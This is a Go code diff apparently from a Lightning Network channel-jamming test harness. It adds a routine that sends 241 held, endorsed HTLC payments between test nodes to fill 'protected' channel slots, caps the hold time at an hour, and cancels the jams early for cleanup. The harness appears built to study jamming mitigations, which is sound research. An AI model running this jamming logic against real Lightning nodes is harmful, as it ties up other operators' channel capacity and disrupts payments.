@@ -60,6 +60,13 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	// While WIP, cancel these payments back for easier cleanup.
 	log.Printf("Dispatched: %v general slow jams", len(chans))
 
+	protectedChans, err := jamProtected(ctx, jammer)
+	if err != nil {
+		return fmt.Errorf("slow jam protected: %w", err)
+	}
+
+	log.Printf("Dispatched: %v protected slow jams", len(chans))
+
 	for i, jam := range chans {
 		log.Printf("Canceling slowjam: %v early", i)
 		close(jam.req.EarlySettle)
@@ -70,6 +77,18 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 			return ctx.Err()
 		}
 	}
+
+	for i, jam := range protectedChans {
+		log.Printf("Canceling protected slowjam: %v early", i)
+		close(jam.req.EarlySettle)
+
+		select {
+		case <-jam.resp:
+		case <-ctx.Done():
+			return ctx.Err()
+		}
+	}
+
 	return nil
 }
 
@@ -93,8 +112,62 @@ func getSlowJamHold(ctx context.Context, route *lndclient.QueryRoutesResponse,
 	relativeHold := absHoldHeight - info.BlockHeight
 
 	// Assume 5 minute blocks
-	return time.Duration(relativeHold) * 5 * time.Minute, nil
+	holdTime := time.Duration(relativeHold) * 5 * time.Minute
+
+	// Our goal is to hold for an hour, so we'll pick the minimum.
+	if holdTime < time.Hour {
+		return holdTime, nil
+	}
+
+	return time.Hour, nil
 }
+
+func jamProtected(ctx context.Context, j *JammingHarness) ([]jamPair, error) {
+	jamAmt := lnwire.MilliSatoshi(400_000)
+	zeroToTwo, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
+		ctx,
+		lndclient.QueryRoutesRequest{
+			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
+			AmtMsat:      jamAmt,
+			FeeLimitMsat: lnwire.MaxMilliSatoshi,
+		},
+	)
+	if err != nil {
+		return nil, fmt.Errorf("0 -> 2: %w", err)
+	}
+
+	wait, err := getSlowJamHold(ctx, zeroToTwo, j)
+	if err != nil {
+		return nil, err
+	}
+
+	var jamChans []jamPair
+	for i := 0; i < 483/2; i++ {
+		req := JammingPaymentReq{
+			AmtMsat:         jamAmt,
+			SourceIdx:       0,
+			DestIdx:         2,
+			EndorseOutgoing: true,
+			SettleWait:      wait,
+			Settle:          false,
+			EarlySettle:     make(chan struct{}),
+		}
+
+		log.Printf("Sending protected jam: %v", i)
+		resp, err := j.JammingPaymentRoute(ctx, req, *zeroToTwo)
+		if err != nil {
+			return nil, fmt.Errorf("%v - probe: %v", i, err)
+		}
+
+		jamChans = append(jamChans, jamPair{
+			req:  req,
+			resp: resp,
+		})
+	}
+
+	return jamChans, nil
+}
+
 func slowJamGeneral(ctx context.Context, j *JammingHarness) (
 	[]jamPair, error) {
 
